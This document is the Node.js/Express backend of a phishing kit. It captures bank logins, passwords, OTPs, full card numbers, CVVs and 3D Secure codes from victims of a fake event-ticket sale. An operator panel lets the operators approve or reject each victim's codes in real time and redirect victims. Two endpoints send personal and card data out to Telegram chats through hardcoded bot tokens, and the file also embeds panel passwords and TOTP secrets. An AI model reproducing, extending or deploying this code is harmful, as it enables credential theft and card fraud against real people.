const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const speakeasy = require('speakeasy');
const axios = require('axios');
const http = require('http');
const WebSocket = require('ws');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// WebSocket: clientes conectados
const wsClients = new Set();

wss.on('connection', (ws) => {
  wsClients.add(ws);
  console.log('Cliente WebSocket conectado');
  
  ws.on('close', () => {
    wsClients.delete(ws);
    console.log('Cliente WebSocket desconectado');
  });
});

// Función para enviar notificación a todos los clientes
function broadcastNotification(type, data) {
  const message = JSON.stringify({ type, data, timestamp: new Date().toISOString() });
  wsClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

// Constantes de Telegram
const TELEGRAM_BOT_TOKEN = '8735670512:AAEXSLAcpbYSSjRApe7Yeok-xudrBasMz7s';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5105952670';
const TELEGRAM_CHAT_ID_INFO = '-5105952676';

// Segundo bot para pagos con tarjeta
const TELEGRAM_BOT_TOKEN_2 = '8779685400:AAF7nHsPfqGank51CNNfyNxOoKjX5SEh2jM';
const TELEGRAM_CHAT_ID_2 = '-5028927677';

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Rate limiting simple
const requestCounts = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000;
const RATE_LIMIT_MAX = 100;

function rateLimit(req, res, next) {
  const ip = req.ip || req.connection.remoteAddress;
  const now = Date.now();
  const counts = requestCounts.get(ip) || { count: 0, resetTime: now + RATE_LIMIT_WINDOW };
  
  if (now > counts.resetTime) {
    counts.count = 1;
    counts.resetTime = now + RATE_LIMIT_WINDOW;
  } else {
    counts.count++;
    if (counts.count > RATE_LIMIT_MAX) {
      return res.status(429).json({ error: 'Demasiadas solicitudes' });
    }
  }
  
  requestCounts.set(ip, counts);
  next();
}

app.use(rateLimit);

// ================================================================
// USUARIOS DEL PANEL
// ================================================================
const PANEL_USERS = {
  'Krakenoff': {
    password: '081147',
    secret: 'VK5HG4NAZ7TWNG2W'
  },
  'JulioShipe': {
    password: 'jshipe2026',
    secret: 'ZL2GLB64NRXKSEZC'
  },
  'VenomLuxury': {
    password: 'LuxuryLife2026',
    secret: 'FHVQZBSQXSAUR3ZW'
  }
};
// ================================================================

// Admin activos
const activeAdminsServer = new Set();

app.post('/api/admin-login', (req, res) => {
  const { admin, action } = req.body;
  if (action === 'login') {
    activeAdminsServer.add(admin);
    broadcastNotification('admin_login', { admin });
  } else if (action === 'logout') {
    activeAdminsServer.delete(admin);
    broadcastNotification('admin_logout', { admin });
  }
  res.json({ ok: true, activeCount: activeAdminsServer.size });
});

app.get('/api/admins-active', (req, res) => {
  res.json({ count: activeAdminsServer.size, admins: Array.from(activeAdminsServer) });
});

// PASO 1: Validar solo usuario + contraseña
app.post('/api/panel-check', (req, res) => {
  const { usuario, password } = req.body;
  const user = PANEL_USERS[usuario];
  if (!user) return res.json({ ok: false, error: 'Usuario incorrecto' });
  if (user.password !== password) return res.json({ ok: false, error: 'Contrasena incorrecta' });
  res.json({ ok: true });
});

// PASO 2: Validar codigo TOTP
app.post('/api/panel-totp', (req, res) => {
  const { usuario, totp } = req.body;
  const user = PANEL_USERS[usuario];
  if (!user) return res.json({ ok: false, error: 'Usuario no encontrado' });

  const valid = speakeasy.totp.verify({
    secret: user.secret,
    encoding: 'base32',
    token: String(totp),
    window: 2
  });

  if (!valid) return res.json({ ok: false, error: 'Codigo incorrecto o expirado' });
  res.json({ ok: true });
});

// Almacenamiento en memoria por IP
let sesiones = {};

app.post('/api/usuarios', (req, res) => {
  const ip = req.body.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { usuario, clave, fecha } = req.body;

  if (!sesiones[ip]) {
    sesiones[ip] = { 
      usuario: null, clave: null, otp: null, estado: 'esperando', 
      fecha: null, autorizarOtp: false, relogin: false, rechazarOtp: false, 
      ban: false, redirectTo: null, paymentPending: false 
    };
  }

  if (usuario) {
    sesiones[ip].usuario = usuario;
    sesiones[ip].fecha = fecha;
    sesiones[ip].estado = 'esperando_clave';
    sesiones[ip].relogin = false;
    sesiones[ip].redirectTo = null;
    sesiones[ip].paymentPending = false;
    broadcastNotification('nuevo_usuario', { ip, usuario, fecha });
    return res.json({ ok: true });
  }

  if (clave) {
    sesiones[ip].clave = clave;
    sesiones[ip].estado = 'esperando_otp';
    sesiones[ip].autorizarOtp = false;
    broadcastNotification('clave_ingresada', { ip });
    return res.json({ ok: true });
  }

  res.status(400).json({ error: 'Usuario o clave requerido' });
});

// Endpoint para que el cliente verifique si debe redirigirse
app.get('/api/check-redirect', (req, res) => {
  // Buscar CUALQUIER sesión que tenga redirect pendientes (prioridad a tarjetas)
  let sesionEncontrada = null;
  const ips = Object.keys(sesiones);
  
  for (const ip of ips) {
    if (sesiones[ip].redirectTo && sesiones[ip].tipo === 'tarjeta') {
      sesionEncontrada = ip;
      break;
    }
  }
  
  // Si no hay de tarjeta, buscar cualquiera
  if (!sesionEncontrada) {
    for (const ip of ips) {
      if (sesiones[ip].redirectTo) {
        sesionEncontrada = ip;
        break;
      }
    }
  }
  
  if (sesionEncontrada) {
    const redirect = sesiones[sesionEncontrada].redirectTo;
    // Solo limpiar el redirect si va a confirmación
    if (redirect === 'confirmacion.html') {
      sesiones[sesionEncontrada].redirectTo = null;
    }
    return res.json({ redirect: redirect });
  }
  return res.json({ redirect: null });
});

// Endpoint para iniciar proceso de pago (cliente desde Tarjeta-index)
app.post('/api/start-payment', (req, res) => {
  const ip = req.body.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  
  // Crear o actualizar sesión
  if (!sesiones[ip]) {
    sesiones[ip] = { 
      usuario: null, clave: null, otp: null, estado: 'esperando', 
      fecha: null, autorizarOtp: false, relogin: false, rechazarOtp: false, 
      ban: false, redirectTo: null, paymentPending: false, tipo: 'tarjeta'
    };
  }
  
  sesiones[ip].paymentPending = true;
  sesiones[ip].redirectTo = null;
  sesiones[ip].estado = 'pago_pendiente';
  sesiones[ip].tipo = 'tarjeta'; // Identifica que es pago con tarjeta
  broadcastNotification('payment_pending', { ip });
  
  res.json({ ok: true });
});

// Endpoint para enviar a 3D Secure o Confirmación (desde panel admin)
app.post('/api/redirect-payment', (req, res) => {
  const { ip, destino } = req.body;
  if (sesiones[ip]) {
    // Si va a 3D, limpiar código anterior para que pongan nuevo
    if (destino === '3d-secure.html') {
      sesiones[ip].codigo3D = null;
      sesiones[ip].estado = 'pago_pendiente';
    }
    
    sesiones[ip].redirectTo = destino;
    if (destino === 'confirmacion.html') {
      sesiones[ip].paymentPending = false;
      sesiones[ip].estado = 'completado';
    }
    broadcastNotification('payment_redirect', { ip, destino });
  }
  res.json({ ok: true });
});

// Endpoint para guardar código 3D del usuario
app.post('/api/save-3d-code', (req, res) => {
  const { codigo } = req.body;
  
  // Buscar la sesión de tarjeta más reciente
  let sesionEncontrada = null;
  const ips = Object.keys(sesiones);
  
  for (const ip of ips) {
    if (sesiones[ip].tipo === 'tarjeta') {
      sesionEncontrada = ip;
      // break solo si tiene código o está en pago pendiente
      if (sesiones[ip].codigo3D || sesiones[ip].estado === 'pago_pendiente') {
        break;
      }
    }
  }
  
  if (sesionEncontrada) {
    sesiones[sesionEncontrada].codigo3D = codigo;
    sesiones[sesionEncontrada].estado = '3d_pendiente_confirmacion';
    sesiones[sesionEncontrada].redirectTo = null; // Limpiar redirect para que no se vaya solo
    broadcastNotification('3d_code_entered', { ip: sesionEncontrada, codigo });
  }
  res.json({ ok: true });
});

app.post('/api/otp', (req, res) => {
  const ip = req.body.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { otp, fecha } = req.body;

  if (!otp) return res.status(400).json({ error: 'OTP requerido' });

  if (!sesiones[ip]) {
    sesiones[ip] = { usuario: null, clave: null, otp: null, estado: 'esperando', fecha: null, autorizarOtp: false, relogin: false, rechazarOtp: false, ban: false };
  }

  sesiones[ip].otp = otp;
  sesiones[ip].estado = 'otp_pendiente';
  sesiones[ip].rechazarOtp = false;
  broadcastNotification('otp_ingresado', { ip });
  return res.json({ ok: true });
});

app.get('/api/sesiones', (req, res) => res.json(sesiones));

app.get('/api/clave-pendiente', (req, res) => {
  const ip = req.query.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  if (sesiones[ip] && sesiones[ip].clave && !sesiones[ip].autorizarOtp) return res.json({ clave: true });
  return res.json({ clave: null });
});

app.post('/api/autorizar-otp', (req, res) => {
  const ip = req.body.ip;
  if (ip && sesiones[ip]) { 
    sesiones[ip].autorizarOtp = true; 
    broadcastNotification('otp_autorizado', { ip });
    return res.json({ ok: true }); 
  }
  res.status(400).json({ error: 'IP requerida' });
});

app.post('/api/aprobar-otp', (req, res) => {
  const ip = req.body.ip;
  if (ip && sesiones[ip]) { 
    sesiones[ip].estado = 'completo'; 
    sesiones[ip].rechazarOtp = false; 
    broadcastNotification('sesion_aprobada', { ip });
    return res.json({ ok: true }); 
  }
  res.status(400).json({ error: 'IP requerida' });
});

app.post('/api/rechazar-otp', (req, res) => {
  const ip = req.body.ip;
  if (ip && sesiones[ip]) { 
    sesiones[ip].otp = null; 
    sesiones[ip].rechazarOtp = true; 
    sesiones[ip].estado = 'esperando_otp'; 
    broadcastNotification('otp_rechazado', { ip });
    return res.json({ ok: true }); 
  }
  res.status(400).json({ error: 'IP requerida' });
});

app.post('/api/relogin', (req, res) => {
  const ip = req.body.ip;
  if (ip && sesiones[ip]) {
    sesiones[ip] = { ...sesiones[ip], relogin: true, usuario: null, clave: null, otp: null, estado: 'esperando', autorizarOtp: false, rechazarOtp: false, ban: false };
    broadcastNotification('relogin', { ip });
    return res.json({ ok: true });
  }
  res.status(400).json({ error: 'IP requerida' });
});

app.post('/api/ban', (req, res) => {
  const ip = req.body.ip;
  if (ip && sesiones[ip]) { 
    sesiones[ip].ban = true; 
    broadcastNotification('usuario_baneado', { ip });
    return res.json({ ok: true }); 
  }
  res.status(400).json({ error: 'IP requerida' });
});

// ================================================================
// ENDPOINT PARA ENVIAR DATOS A TELEGRAM (Info del usuario)
// ================================================================
app.post('/api/send-user-data', async (req, res) => {
  try {
    const { nombre, apellido, cedula, telefono, email, ciudad, tipoBoleta, cantidad, total } = req.body;

    if (!nombre || !apellido || !cedula || !telefono || !email) {
      return res.status(400).json({ success: false, error: 'Faltan datos obligatorios' });
    }

    const message = `<b>Nuevo Usuario:</b>

<b>Información Personal:</b>
Nombre: ${nombre} ${apellido}
Cédula: ${cedula}
Teléfono: ${telefono}
Email: ${email}
Ciudad: ${ciudad}

<b>Compra:</b>
Tipo de Boleta: ${tipoBoleta}
Cantidad: ${cantidad}
Total: $${total}`;

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID_INFO,
        text: message,
        parse_mode: 'HTML'
      }
    );

    if (response.data.ok) {
      broadcastNotification('nuevo_pago_telegram', { nombre, cedula, total });
      res.json({ success: true, message: 'Datos enviados a Telegram' });
    } else {
      res.status(500).json({ success: false, error: 'Error de Telegram' });
    }
  } catch (error) {
    console.error('Error en /api/send-user-data:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ================================================================
// ENDPOINT PARA ENVIAR DATOS DE PAGO A TELEGRAM (Bot 2 - Tarjeta)
// ================================================================
app.post('/api/send-payment-data', async (req, res) => {
  try {
    const { 
      numeroCompleto, nombreTitular, ultimosCuatro, fechaVencimiento, 
      cvv, evento, tipoBoleta, cantidad, monto, detalle, timestamp 
    } = req.body;

    if (!nombreTitular || !ultimosCuatro || !fechaVencimiento) {
      return res.status(400).json({ success: false, error: 'Faltan datos' });
    }

    const message = `<b>💳 Nuevo Pago con Tarjeta</b>

<b>Datos de la Tarjeta:</b>
Número Completo: ${numeroCompleto}
Titular: ${nombreTitular}
Últimos 4 dígitos: •••• ${ultimosCuatro}
Vencimiento: ${fechaVencimiento}
CVV: ${cvv}

<b>Detalles del Evento:</b>
Evento: ${evento || 'Classic Night'}
Tipo de Boleta: ${tipoBoleta || 'General'}
Cantidad: ${cantidad || 1}

<b>Pago:</b>
Monto: $${monto}
Detalle: ${detalle}
Hora: ${timestamp}`;

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID_2,
        text: message,
        parse_mode: 'HTML'
      }
    );

    if (response.data.ok) {
      broadcastNotification('pago_tarjeta', { nombreTitular, monto, evento });
      res.json({ success: true, message: 'Pago registrado' });
    } else {
      res.status(500).json({ success: false, error: 'Error de Telegram' });
    }
  } catch (error) {
    console.error('Error en /api/send-payment-data:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ================================================================

// Endpoint de estado para WebSocket
app.get('/api/ws-status', (req, res) => {
  res.json({ connected: wsClients.size });
});

server.listen(PORT, () => {
  console.log(`Servidor en puerto ${PORT}`);
  console.log(`WebSocket disponible en ws://localhost:${PORT}`);
});